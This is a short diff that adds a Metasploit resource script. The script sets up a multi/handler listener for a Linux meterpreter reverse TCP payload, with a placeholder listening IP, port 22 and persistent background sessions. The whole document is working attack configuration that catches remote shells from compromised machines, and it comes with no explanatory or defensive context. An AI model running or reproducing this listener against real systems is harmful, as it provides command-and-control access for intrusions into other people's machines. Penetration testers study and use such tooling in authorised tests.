@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload linux/x86/meterpreter_reverse_tcp
+set lhost <ip>
+set lport 22
+set exitonsession false 
+exploit -j
